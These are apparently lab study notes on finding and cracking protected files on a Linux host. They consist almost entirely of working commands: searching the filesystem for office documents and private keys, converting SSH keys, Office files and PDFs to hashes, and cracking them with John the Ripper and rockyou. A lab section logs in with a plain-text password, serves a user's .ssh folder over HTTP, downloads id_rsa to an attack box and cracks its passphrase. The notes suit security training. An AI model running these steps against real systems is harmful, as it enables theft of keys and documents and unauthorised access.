# Protected Files

Storage of files : symmetric encryption like AES-256
Transmission of files :  asymmetric encryption 

## Hunting for Encoded Files

for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

## Hunting for SSH Keys

grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

## Encrypted SSH Keys

cat /home/cry0l1t3/.ssh/SSH.private

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED

--> Encrypted

## Cracking SSH Key with John

locate *2john*

/usr/share/john/ssh2john.py

ssh2john.py SSH.private > ssh.hash
cat ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show

SSH.private:1234
1 password hash cracked, 0 left

## Cracking Documents

### Cracking Microsoft Office Documents

office2john.py Protected.docx > protected-docx.hash
cat protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show

Protected.docx:1234

### Cracking PDFs

pdf2john.py PDF.pdf > pdf.hash
cat pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show

PDF.pdf:1234

## LAB

ssh kira@$TARGET
L0vey0u1!

grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

/home/kira/.ssh/id_rsa:1:-----BEGIN RSA PRIVATE KEY-----

On target :
cd /home/kira/.ssh/
python3 -m http.server

On pwnbox :
wget $TARGET:8000/id_rsa


cat /home/kira/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED

/usr/share/john/ssh2john.py id_rsa > ssh.hash

sed 's/decodestring/decodebytes/' /usr/share/john/ssh2john.py | python3 - id_rsa> ssh.hash

john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
john ssh.hash --show

id_rsa:L0veme

1 password hash cracked, 0 left

